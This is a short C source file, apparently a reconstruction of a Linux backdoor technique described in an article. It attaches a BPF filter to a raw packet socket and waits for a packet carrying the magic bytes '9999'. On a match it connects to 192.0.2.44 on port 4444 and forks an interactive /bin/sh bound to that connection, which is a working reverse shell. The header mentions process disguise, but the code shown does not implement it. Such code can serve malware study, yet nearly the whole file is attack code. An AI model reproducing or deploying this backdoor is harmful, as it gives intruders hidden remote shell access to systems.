/* Representative reconstruction: BPF wake-up, process disguise, shell callback.
 * The article supplies the technique; this is not recovered malware source.
 */
#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

int main(void) {
    int capture = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (capture < 0) return 1;
    struct sock_filter instructions[] = {
        BPF_STMT(BPF_LD | BPF_H | BPF_ABS, 12),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, ETH_P_IP, 0, 4),
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 23),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_TCP, 1, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_UDP, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, 65535),
        BPF_STMT(BPF_RET | BPF_K, 0)
    };
    struct sock_fprog filter = {7, instructions};
    if (setsockopt(capture, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) < 0)
        return 1;
    char packet[4096];
    while (1) {
        ssize_t n = recvfrom(capture, packet, sizeof(packet), 0, 0, 0);
        if (n < 30 || memcmp(packet + 26, "9999", 4)) continue;
        int channel = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in remote = {0};
        remote.sin_family = AF_INET;
        remote.sin_port = htons(4444);
        inet_pton(AF_INET, "192.0.2.44", &remote.sin_addr);
        if (connect(channel, (struct sockaddr *)&remote, sizeof(remote))) continue;
        if (fork() == 0) {
            close(capture);
            for (int fd = 0; fd < 3; fd++) dup2(channel, fd);
            execl("/bin/sh", "sh", "-i", (char *)0);
            _exit(1);
        }
        close(channel);
    }
}
